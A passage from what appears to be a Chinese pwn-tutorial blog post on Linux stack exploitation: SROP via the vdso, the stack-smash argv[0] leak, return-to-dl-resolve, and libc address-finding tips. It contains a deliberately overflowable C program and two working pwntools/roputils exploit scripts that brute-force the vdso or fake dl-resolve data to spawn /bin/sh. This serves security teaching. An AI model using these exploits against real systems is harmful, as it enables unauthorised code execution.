+<p>利用过程比较麻烦的一点是找sigreturn的地址(或gadget)。对于x86来说，vdso(vitualdynamic sharedobject)会有sigreturn的地址，而且vdso的地址可以很容易爆破得到。因为即使对开了ASLR的linux来说，其地址也只有一个字节是随机的。</p>
+<div class="highlight"><pre><span></span>gdb-peda$x/3i 0xf7fdb411
+    0xf7fdb411&lt;__kernel_sigreturn+1&gt;:   mov    eax,0x77
+    0xf7fdb416&lt;__kernel_sigreturn+6&gt;:   int    0x80
+    0xf7fdb418&lt;__kernel_sigreturn+8&gt;:   nop
+</pre></div>
+
+<p>但是对x64来说，爆破vdso就比较难了。原来只有11bit是随记的，但我在我的linux上测试好像有22位是随机的了，爆破也就几小时而已(个人亲测)，还是能爆出来的。关于64位的爆破，可参考Return to VDSO using ELF Auxiliary Vectors。</p>
+<p><strong><em>Example</em></strong></p>
+<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
+<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;/bin/sh</span><span class="se">\x00</span><span class="s">&quot;</span><span class="p">;</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;input something you want: &quot;</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+<p><strong><em>Exp</em></strong></p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">random</span>
+
+<span class="n">binsh_addr</span> <span class="o">=</span> <span class="mh">0x804a024</span>
+<span class="n">bss_addr</span> <span class="o">=</span> <span class="mh">0x804a02e</span>
+<span class="n">vdso_range</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0xf7700000</span><span class="p">,</span> <span class="mh">0xf7800000</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">p</span>
+    <span class="n">debug</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
+        <span class="c1">#context.level_log = &quot;debug&quot;</span>
+        <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&quot;i386&quot;</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./srop_test&#39;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">pass</span>
+
+    <span class="k">global</span> <span class="n">vdso_addr</span>
+    <span class="n">vdso_addr</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">vdso_range</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x10c</span>
+    <span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">(</span><span class="n">kernel</span> <span class="o">=</span> <span class="s2">&quot;i386&quot;</span><span class="p">)</span>
+    <span class="n">frame</span><span class="o">.</span><span class="n">eax</span> <span class="o">=</span> <span class="mh">0xb</span>
+    <span class="n">frame</span><span class="o">.</span><span class="n">ebx</span> <span class="o">=</span> <span class="n">binsh_addr</span>
+    <span class="n">frame</span><span class="o">.</span><span class="n">ecx</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">frame</span><span class="o">.</span><span class="n">edx</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">frame</span><span class="o">.</span><span class="n">eip</span> <span class="o">=</span> <span class="n">vdso_addr</span> <span class="o">+</span> <span class="mh">0x416</span>  <span class="c1">#address of int 80h</span>
+    <span class="n">frame</span><span class="o">.</span><span class="n">esp</span> <span class="o">=</span> <span class="n">bss_addr</span> <span class="c1"># whatever</span>
+    <span class="n">frame</span><span class="o">.</span><span class="n">ebp</span> <span class="o">=</span> <span class="n">bss_addr</span> <span class="c1"># whatever</span>
+    <span class="n">frame</span><span class="o">.</span><span class="n">gs</span> <span class="o">=</span> <span class="mh">0x63</span>
+    <span class="n">frame</span><span class="o">.</span><span class="n">cs</span> <span class="o">=</span> <span class="mh">0x23</span>
+    <span class="n">frame</span><span class="o">.</span><span class="n">es</span> <span class="o">=</span> <span class="mh">0x2b</span>
+    <span class="n">frame</span><span class="o">.</span><span class="n">ds</span> <span class="o">=</span> <span class="mh">0x2b</span>
+    <span class="n">frame</span><span class="o">.</span><span class="n">ss</span> <span class="o">=</span> <span class="mh">0x2b</span>
+
+    <span class="n">ret_addr</span> <span class="o">=</span> <span class="n">vdso_addr</span> <span class="o">+</span> <span class="mh">0x411</span>  <span class="c1">#address of sigreturn syscall</span>
+
+    <span class="c1">#print payload</span>
+
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;input something you want: </span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;echo pwned!&quot;</span><span class="p">)</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;pwned!&quot;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">r</span> <span class="o">!=</span> <span class="s2">&quot;pwned!&quot;</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">&quot;Failed!&quot;</span><span class="p">)</span>
+
+    <span class="k">return</span>
+
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="k">global</span> <span class="n">p</span><span class="p">,</span> <span class="n">vdso_addr</span>
+    <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Try </span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">i</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">main</span><span class="p">()</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="c1">#print e</span>
+            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+            <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+            <span class="k">continue</span>
+        <span class="k">print</span> <span class="s2">&quot;vdso_addr: &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">vdso_addr</span><span class="p">)</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+        <span class="k">break</span>
+</pre></div>
+
+<h1 id="5-fspo">5. FSPO</h1>
+<p>File-Stream-Pointer-Overflow，适合存在FILE*指针的情况</p>
+<h1 id="6-stack-smash-using-abort-message">6. Stack smash / Using abort message</h1>
+<p>在程序加了canary保护之后，如果我们读取的buffer覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而stack smash技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序发现canary保护之后，如果发现canary被修改的话，程序就会执行__stack_chk_fail函数来打印argv[0]指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下</p>
+<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">__attribute__</span> <span class="p">((</span><span class="n">noreturn</span><span class="p">))</span> <span class="n">__stack_chk_fail</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">__fortify_fail</span> <span class="p">(</span><span class="s">&quot;stack smashing detected&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="nf">__attribute__</span> <span class="p">((</span><span class="n">noreturn</span><span class="p">))</span> <span class="n">internal_function</span> <span class="n">__fortify_fail</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="cm">/* The loop is added only to keep gcc happy.  */</span>
+  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">__libc_message</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">&quot;*** %s ***: %s terminated</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
+                    <span class="n">msg</span><span class="p">,</span> <span class="n">__libc_argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">?:</span> <span class="s">&quot;&lt;unknown&gt;&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+<p>所以说如果我们利用栈溢出覆盖argv[0]为我们想要输出的字符串的地址，那么在__fortify_fail函数中就会输出我们想要的信息。</p>
+<h1 id="7-return-2-dl-resolve">7. return 2 dl-resolve</h1>
+<p>returnto dl-resolve利用的就是函数的lazybinding。在此过程中会调用_dl_runtime_roslve函数，然后这个函数会调用fixup()函数来获得函数的地址，并把地址写入相应reloc的r_offset字段(GOT),然后执行解析的函数</p>
+<p><em>注：dl-resolve函数其实跟fixup函数实现的是相同的功能，只是在不同glibc中名字不同而已</em></p>
+<p>跳转到对应的plt项</p>
+<div class="highlight"><pre><span></span>(gdb) x/4i 0x80483f0
+   0x80483f0 &lt;write@plt&gt;:       jmp    *0x804a020
+   0x80483f6 &lt;write@plt+6&gt;:     push   $0x28
+   0x80483fb &lt;write@plt+11&gt;:        jmp    0x8048390
+</pre></div>
+
+<p>然后跳转都相应got项。当然第一次调用时其got表项存放的是相应plt表项的第二条指令的地址。其实又回到了plt表项。</p>
+<p>再把相应偏移量push后，然后跳转到PLT[0]，就是上面的第三条指令。第一次push GOT[1]，一个指向link_map结构体的指针，然后跳转到GOT[2]里面存放的地址,即<code>_dl_runtime_resolve</code>函数的地址。然后此函数会把解析得到的函数地址写入reloc项的r_offset字段。最后在<code>_dl_runtime_resolve</code>返回后跳到了相应的函数体执行。</p>
+<p>PLT[0]存放的内容如下：</p>
+<div class="highlight"><pre><span></span>(gdb) x/2i 0x8048390
+   0x8048390:   pushl  0x804a004
+   0x8048396:   jmp    *0x804a008
+</pre></div>
+
+<p>其实就是函数参数先压栈，然后执行了_dl_runtime_resolve(*link_map, rel_offset)函数。</p>
+<p>要详细理解这种利用方式，必须对elf文件格式有所了解。</p>
+<p>具体_dl_runtime_resolve函数的具体执行过程如下：</p>
+<ol>
+<li>
+<p>计算函数的relocentry。</p>
+<p>Elf32_Rel* reloc = JMPREL + reloc_offset;</p>
+</li>
+</ol>
+<ol>
+<li>
+<p>计算函数的symtabentry。</p>
+<p>Elf32_Sym* sym = &amp;SYMTAB[ ELF32_R_SYM (reloc-&gt;r_info) ];</p>
+</li>
+</ol>
+<ol>
+<li>
+<p>securitycheck</p>
+<p>assert(ELF32_R_TYPE(reloc-&gt;r_info) == R_386_JMP_SLOT);</p>
+</li>
+</ol>
+<ol>
+<li>
+<p>计算函数名称在dynstr表中的偏移。</p>
+<p>name= STRTAB + sym-&gt;st_name;</p>
+</li>
+</ol>
+<ol>
+<li>函数地址写入相应的项，堆栈调整，执行函数</li>
+</ol>
+<p><strong><em>Exploit</em></strong> 怎么利用？</p>
+<ol>
+<li>控制EIP为PLT[0]的地址，只需传递一个index_arg参数</li>
+<li>控制index_arg的大小，使reloc的位置落在可控地址内</li>
+<li>伪造reloc的内容，使sym落在可控地址内</li>
+<li>伪造sym的内容，使name落在可控地址内</li>
+<li>伪造name为任意库函数，如system</li>
+</ol>
+<p>64位比32位有了些许变化。相关的结构体大小不同，函数参数也变成由寄存器传递而非栈传递。需要注意的是64位还需要泄露link_map的值，目的是将link_map+0x1c8处设为NULL，这样才能绕过相关检测</p>
+<p>使用<code>roputils</code></p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">roputils</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">process</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">gdb</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">context</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+
+<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">112</span>
+<span class="n">bss_base</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">section</span><span class="p">(</span><span class="s1">&#39;.bss&#39;</span><span class="p">)</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
+
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s1">&#39;read&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">bss_base</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
+<span class="c1">## used to call dl_Resolve()</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">dl_resolve_call</span><span class="p">(</span><span class="n">bss_base</span> <span class="o">+</span> <span class="mi">20</span><span class="p">,</span> <span class="n">bss_base</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+
+<span class="n">buf</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">string</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>
+<span class="c1">## used to make faking data, such relocation, Symbol, Str</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">dl_resolve_data</span><span class="p">(</span><span class="n">bss_base</span> <span class="o">+</span> <span class="mi">20</span><span class="p">,</span> <span class="s1">&#39;system&#39;</span><span class="p">)</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+
+<h1 id="_1"># 技巧</h1>
+<h2 id="0-one_gadget">0. One_gadget</h2>
+<blockquote>
+<p><a href="https://github.com/david942j/one_gadget">https://github.com/david942j/one_gadget</a></p>
+</blockquote>
+<h2 id="1-syscall">1. 固定地址的syscall</h2>
+<p>sycall指令位于 <code>read_addr + 0xe</code></p>
+<p>在x86_64架构上该偏移<code>0xe</code>很固定</p>
+<p>x86上的也有类似</p>
+<h2 id="2-leaking-canary-byte-by-byte">2. Leaking canary byte-by-byte</h2>
+<p>逐个字节泄露canary，该技术适用于fork出的进程，canary固定，可使用溢出技术逐个爆破canary，若错误则会退出，若正确则不退出</p>
+<h2 id="3">3. 反复触发漏洞函数</h2>
+<p>有时候存在栈溢出的函数默认逻辑只能被调用一次，若需要多次调用，可将栈上的返回地址再度覆盖为有漏洞的函数，使得漏洞函数能够多次调用，获取必要信息。也可覆盖<code>fini_array</code>的有关地址，再次强制进入漏洞函数。</p>
+<h2 id="4-shell">4. shell获取小结</h2>
+<p>这里总结几种常见的获取shell的方式：</p>
+<ul>
+<li>执行shellcode，这一方面也会有不同的情况<ul>
+<li>可以直接返回shell</li>
+<li>可以将shell返回到某一个端口</li>
+<li>shellcode中字符有时候需要满足不同的需求</li>
+<li><strong>注意，我们需要将shellcode写在可以执行的内存区域中。</strong></li>
+</ul>
+</li>
+<li>执行 system("/bin/sh"), system('sh') 等等<ul>
+<li>关于 system 的地址，参见下面章节的<strong>地址寻找</strong>。</li>
+<li>关于 "/bin/sh"， “sh”<ul>
+<li>首先寻找 binary 里面有没有对应的字符串，<strong>比如说有 flush 函数，那就一定有 sh 了</strong></li>
+<li>考虑个人读取对应字符串</li>
+<li>libc 中其实是有 /bin/sh 的</li>
+</ul>
+</li>
+<li>优点<ul>
+<li>只需要一个参数。</li>
+</ul>
+</li>
+<li>缺点<ul>
+<li><strong>有可能因为破坏环境变量而无法执行。</strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>执行 execve("/bin/sh",NULL,NULL)<ul>
+<li>前几条同 system</li>
+<li>优点<ul>
+<li>几乎不受环境变量的影响。</li>
+</ul>
+</li>
+<li>缺点<ul>
+<li><strong>需要 3 个参数。</strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>系统调用<ul>
+<li>系统调用号 11</li>
+</ul>
+</li>
+</ul>
+<h2 id="5">5. 地址寻找小结</h2>
+<p>在整个漏洞利用过程中，我们总是免不了要去寻找一些地址，常见的寻找地址的类型，有如下几种</p>
+<h3 id="_2">通用寻找</h3>
+<h4 id="_3">直接地址寻找</h4>
+<p>程序中已经给出了相关变量或者函数的地址了。这时候，我们就可以直接进行利用了。</p>
+<h4 id="got">got表寻找</h4>
+<p>有时候我们并不一定非得直接知道某个函数的地址，可以利用GOT表的跳转到对应函数的地址。当然，如果我们非得知道这个函数的地址，我们可以利用write，puts等输出函数将GOT表中地址处对应的内容输出出来（<strong>前提是这个函数已经被解析一次了</strong>）。</p>
+<h3 id="libc">有libc</h3>
+<p><strong>相对偏移寻找</strong>，这时候我们就需要考虑利用libc中函数的基地址一样这个特性来寻找了。其实__libc_start_main就是libc在内存中的基地址。<strong>注意：不要选择有wapper的函数，这样会使得函数的基地址计算不正确。</strong>常见的有wapper的函数有（待补充）。</p>
+<h3 id="libc_1">无libc</h3>
+<p>其实，这种情况的解决策略分为两种</p>
+<ul>
+<li>想办法获取libc</li>
+<li>想办法直接获取对应的地址。</li>
+</ul>
+<p>而对于想要泄露的地址，我们只是单纯地需要其对应的内容，所以puts和write均可以。</p>
+<ul>
+<li>puts会有\x00截断的问题</li>
+<li>write可以指定长度输出的内容。</li>
+</ul>
+<p>下面是一些相应的方法</p>
+<h4 id="dynelf">DynELF</h4>
+<p>前提是我们可以泄露任意地址的内容。</p>
+<ul>
+<li><strong>如果要使用write函数泄露的话，一次最好多输出一些地址的内容，因为我们一般是只是不断地向高地址读内容，很有可能导致高地址的环境变量被覆盖，就会导致shell不能启动。</strong></li>
+</ul>
+<h4 id="libc_2">libc数据库</h4>
+<div class="highlight"><pre><span></span>## 更新数据库
+./get
+## 将已有libc添加到数据库中
+./add libc.so 
+## Find all the libc&#39;s in the database that have the given names at the given addresses. 
+./find function1 addr function2 addr
+## Dump some useful offsets, given a libc ID. You can also provide your own names to dump.
+./Dump some useful offsets
+</pre></div>
+
+<p>去libc的数据库中找到对应的和已经出现的地址一样的libc，这时候很有可能是一样的。</p>
+<ul>
+<li>libcdb.com</li>
+</ul>
+<p><strong>当然，还有上面提到的https://github.com/lieanu/LibcSearcher。</strong></p>
+<!-- /content -->
+      <footer>
+        <p>Posted by <a href="https://alset0326.github.io/author/alset0326.html">Alset0326</a> on <time datetime="2018-04-05T09:00:17.387858+08:00">四 05 四月 2018</time> in <a href="https://alset0326.github.io/category/pwn.html">pwn</a>. <span class="m-label m-success">updated <time datetime="2018-04-05T09:00:17.387858+08:00">四 05 四月 2018</time></span> Tags: <a href="https://alset0326.github.io/tag/stack.html">stack</a>, <a href="https://alset0326.github.io/tag/linux.html">linux</a>, <a href="https://alset0326.github.io/tag/pwn.html">pwn</a>.</p>
+      </footer>
+    </article>
+    <nav class="m-navpanel m-col-m-2">
+      <h3>Categories</h3>
+      <ol class="m-block-bar-m">
+        <li><a href="https://alset0326.github.io/category/android.html">android</a></li>
+        <li><a href="https://alset0326.github.io/category/linux.html">linux</a></li>
+        <li><a href="https://alset0326.github.io/category/pwn.html">pwn</a></li>
+        <li><a href="https://alset0326.github.io/category/python.html">python</a></li>
+      </ol>
+      <h3>Tag cloud</h3>
+      <ul class="m-tagcloud">
+        <li class="m-tag-2"><a href="https://alset0326.github.io/tag/android.html">android</a></li>
+        <li class="m-tag-1"><a href="https://alset0326.github.io/tag/aosp.html">aosp</a></li>
+        <li class="m-tag-1"><a href="https://alset0326.github.io/tag/heap.html">heap</a></li>
+        <li class="m-tag-5"><a href="https://alset0326.github.io/tag/linux.html">linux</a></li>
+        <li class="m-tag-1"><a href="https://alset0326.github.io/tag/patch.html">patch</a></li>
+        <li class="m-tag-5"><a href="https://alset0326.github.io/tag/pwn.html">pwn</a></li>
+        <li class="m-tag-2"><a href="https://alset0326.github.io/tag/python.html">python</a></li>
+        <li class="m-tag-1"><a href="https://alset0326.github.io/tag/stack.html">stack</a></li>
+      </ul>
+    </nav>
+  </div>
+</div>
+</main>
+<footer><nav>
+  <div class="m-container">
+    <div class="m-row">
+      <div class="m-col-s-3 m-col-t-6">
+        <h3><a href="https://github.com/alset0326?tab=repositories">Projects</a></h3>
+        <ul>
+          <li><a href="https://github.com/alset0326/peda-arm">peda-arm</a></li>
+          <li><a href="https://github.com/alset0326/zio3">zio3</a></li>
+        </ul>
+      </div>
+      <div class="m-col-s-3 m-col-t-6">
+        <h3><a href="https://alset0326.github.io/">Author</a></h3>
+        <ul>
+          <li><a href="http://127.0.0.1:8000/author/alset0326.html">Alset0326</a></li>
+        </ul>
+      </div>
+      <div class="m-clearfix-t"></div>
+      <div class="m-col-s-3 m-col-t-6">
+        <h3><a href="https://github.com/alset0326">Contact</a></h3>
+        <ul>
+          <li><a href="https://alset0326.github.io/alset0326@gmail.com">E-mail</a></li>
+          <li><a href="https://github.com/alset0326">GitHub</a></li>
+        </ul>
+      </div>
+      <div class="m-col-s-3 m-col-t-6">
+        <h3><a href="https://alset0326.github.io/">Blog</a></h3>
+        <ul>
+          <li><a href="https://alset0326.github.io/category/android.html">android</a></li>
+          <li><a href="https://alset0326.github.io/category/linux.html">linux</a></li>
+          <li><a href="https://alset0326.github.io/category/pwn.html">pwn</a></li>
+          <li><a href="https://alset0326.github.io/category/python.html">python</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="m-row">
+      <div class="m-col-l-10 m-push-l-1">
+        <p>A-NOTES. Powered by <a href="https://getpelican.com">Pelican</a> and <a href="http://mcss.mosra.cz">m.css</a>.</p>
+      </div>
+    </div>
+  </div>
+</nav></footer>
+</body>
+</html>
